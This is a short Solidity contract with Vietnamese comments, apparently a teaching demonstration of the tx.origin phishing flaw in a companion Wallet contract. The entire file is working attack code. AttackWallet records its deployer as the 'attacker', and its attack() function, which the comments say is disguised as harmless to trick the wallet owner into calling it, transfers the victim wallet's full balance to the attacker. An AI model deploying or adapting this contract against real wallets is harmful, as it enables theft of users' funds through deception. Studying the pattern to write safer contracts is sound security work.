// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Wallet.sol";

// HỢP ĐỒNG TẤN CÔNG
contract AttackWallet {
    Wallet wallet;
    address payable public attacker;

    // Khi deploy, cung cấp địa chỉ của Wallet nạn nhân
    constructor(address _walletAddress) {
        wallet = Wallet(_walletAddress);
        attacker = payable(msg.sender); // Lưu lại địa chỉ của hacker
    }

    // Hàm này sẽ được hacker ngụy trang thành một chức năng vô hại
    // để lừa Owner gọi vào
    function attack() public {
        // Hợp đồng này sẽ gọi hàm transfer của Wallet
        // rút toàn bộ tiền về cho hacker.
        wallet.transfer(attacker, address(wallet).balance);
    }
}